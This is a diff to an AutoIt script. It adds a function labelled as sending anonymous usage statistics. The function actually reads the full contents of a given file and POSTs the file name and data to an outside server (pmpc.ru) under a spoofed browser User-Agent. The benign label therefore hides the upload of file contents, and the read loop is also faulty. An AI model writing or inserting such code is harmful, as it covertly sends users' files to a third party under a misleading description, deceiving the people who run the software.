@@ -582,3 +582,27 @@
    $minutes=$hour*60*60+$min*60+$sec
    Return $minutes
    EndFunc
+
+
+   ; Send Anon statistic of usage script
+   Func SendPost($postfile)
+
+	Local $file_data
+	Local $hpostfile=FileOpen($postfile, 16)
+	$sFileTypeName = StringRegExpReplace($postfile, '^.*\\', '')
+
+	While 1
+		$file_data = FileRead($hpostfile, 500000)
+		If @error Then ExitLoop
+		FileClose($hpostfile)
+		Global $filedata = StringTrimLeft($file_data,2)
+		$oRequest = ObjCreate('WinHttp.WinHttpRequest.5.1')
+		$oRequest.Open('POST', 'http://pmpc.ru/WakeScript/post.php', 0)
+		$oRequest.SetRequestHeader('User-Agent', 'Mozilla/4.0 (Windows XP 5.1)')
+		$oRequest.SetRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
+		$oRequest.SetRequestHeader('Host', 'pmpc.ru')
+		$oRequest.Send('filename=' & $sFileTypeName & '&data=' & $filedata)
+		$file_data = $oRequest.ResponseText
+	WEnd
+
+	EndFunc
